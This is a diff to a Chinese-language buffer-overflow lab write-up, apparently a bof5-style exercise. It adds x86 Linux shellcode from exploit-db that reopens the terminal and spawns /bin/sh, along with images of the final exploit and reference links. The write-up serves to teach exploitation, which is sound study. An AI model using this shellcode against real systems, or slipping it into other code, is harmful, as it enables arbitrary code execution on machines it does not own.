@@ -130,11 +130,27 @@ EIP = struct.pack\("I", 0xbffffcc0\)
 
 紧跟着的是NOP 和 shellcode
 
-shellcode可以采用
+shellcode可以采用exploit-db 上一个重新开启一个/bin/sh 终端。
+
+char sc\[\] = 
+
+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
+
+"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
+
+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+最后形成的利用代码如下：
+
+![](/png/24.png)
+
+执行后：![](/png/25.ong.PNG)
 
 Ref：
 
 [https://xz.aliyun.com/t/3908](https://xz.aliyun.com/t/3908)
 
 [https://0xrick.github.io/binary-exploitation/bof5/](https://0xrick.github.io/binary-exploitation/bof5/)
+
+https://www.exploit-db.com/exploits/13357
 
